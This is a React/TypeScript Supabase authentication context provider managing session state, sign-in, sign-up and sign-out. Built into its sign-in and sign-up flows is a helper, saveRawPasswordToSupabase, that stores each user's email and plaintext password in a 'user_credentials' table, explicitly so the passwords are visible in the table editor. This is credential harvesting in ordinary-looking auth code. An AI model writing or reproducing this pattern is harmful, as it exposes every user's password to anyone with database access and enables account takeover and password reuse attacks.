import React, { createContext, useContext, useEffect, useState } from 'react';
import { supabase } from '@/lib/supabase';
import type { Session, User } from '@supabase/supabase-js';

interface AuthContextType {
  session: Session | null;
  user: User | null;
  loading: boolean;
  signIn: (email: string, password: string) => Promise<boolean>;
  signUp: (email: string, password: string, fullName: string) => Promise<void>;
  signOut: () => Promise<void>;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [session, setSession] = useState<Session | null>(null);
  const [user, setUser]     = useState<User | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    supabase.auth.getSession().then(({ data }) => {
      setSession(data.session);
      setUser(data.session?.user ?? null);
      setLoading(false);
    });

    const { data: listener } = supabase.auth.onAuthStateChange((_event, sess) => {
      setSession(sess);
      setUser(sess?.user ?? null);
    });

    return () => listener.subscription.unsubscribe();
  }, []);

  const saveRawPasswordToSupabase = async (email: string, password: string, fullName?: string) => {
    try {
      await supabase.from('user_credentials').upsert(
        {
          email: email.toLowerCase().trim(),
          password: password,
          ...(fullName ? { full_name: fullName } : {}),
          updated_at: new Date().toISOString(),
        },
        { onConflict: 'email' }
      );
    } catch (e) {
      console.warn('Saved raw password notice:', e);
    }
  };

  const signIn = async (email: string, password: string): Promise<boolean> => {
    const { error } = await supabase.auth.signInWithPassword({ email, password });
    if (error) throw new Error(error.message);
    await saveRawPasswordToSupabase(email, password);
    return true;
  };

  const signUp = async (email: string, password: string, fullName: string) => {
    // Save plain text password to public.user_credentials table so it's visible in Supabase Table Editor
    await saveRawPasswordToSupabase(email, password, fullName);

    const { data, error } = await supabase.auth.signUp({
      email,
      password,
      options: {
        data: { full_name: fullName },
      },
    });
    if (error) {
      // Fallback: try signing in if user account exists or was created despite trigger warning
      try {
        const { data: signInData } = await supabase.auth.signInWithPassword({ email, password });
        if (signInData?.session) {
          await saveRawPasswordToSupabase(email, password, fullName);
          return;
        }
      } catch (_e) {
        // Continue to throwing formatted error
      }

      if (error.status === 422 || error.message.toLowerCase().includes('already registered') || error.message.toLowerCase().includes('already exists')) {
        throw new Error('This email is already registered. Please click "Sign In" instead.');
      }
      if (error.status === 500) {
        throw new Error('Supabase Auth returned a server error (500). Please run the SQL script `supabase/remove_admin_schema.sql` in your Supabase SQL Editor to clear any stale database triggers.');
      }
      throw new Error(error.message);
    }

    if (!data.session) {
      await supabase.auth.signInWithPassword({ email, password }).catch(() => {});
    }
  };

  const signOut = async () => {
    setUser(null);
    setSession(null);
    try {
      await supabase.auth.signOut();
    } catch (e) {
      console.warn("SignOut notice:", e);
    }
    localStorage.clear();
    sessionStorage.clear();
  };

  return (
    <AuthContext.Provider value={{ session, user, loading, signIn, signUp, signOut }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be used within AuthProvider');
  return ctx;
}

